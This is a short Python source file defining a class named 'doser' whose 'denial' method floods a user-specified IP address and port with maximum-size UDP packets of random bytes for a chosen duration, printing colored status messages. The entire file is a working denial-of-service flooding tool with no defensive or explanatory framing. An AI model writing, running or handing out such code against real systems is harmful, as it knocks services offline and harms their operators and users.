########################################################
import socket
import random
from colorama import Fore as coloring
import time
########################################################
class doser:
  def __init__(self, port, duration, ip):
    self.ip = ip
    self.duration = int(duration)
    self.port = port

  def denial(self):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(65507)
    timeout = time.time() + int(self.duration)
    print(f"{coloring.BLUE}\n「Sending packets to: {self.ip}」{coloring.RESET}")
    while True:
      try:
        if time.time() > timeout:
          print(f"{coloring.BLUE}─────────────────────────────")
          break
        sock.sendto(data, (self.ip, int(self.port)))
      except:
        print(f"{coloring.RED}「Invalid IP Inputted」{coloring.RESET}")
        break
